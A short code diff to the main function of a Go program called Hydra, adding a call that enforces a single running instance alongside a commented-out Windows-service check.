@@ -5,9 +5,13 @@ import (
 
 	"github.com/Raffy27/Hydra/api"
 	"github.com/Raffy27/Hydra/commands"
+	"github.com/Raffy27/Hydra/util"
 )
 
 func main() {
+
+	//Check single instance
+	util.CheckSingle()
 
 	/*if os.Getenv("nocheck") == "" {
 		if chk, _ := svc.IsWindowsService(); chk {
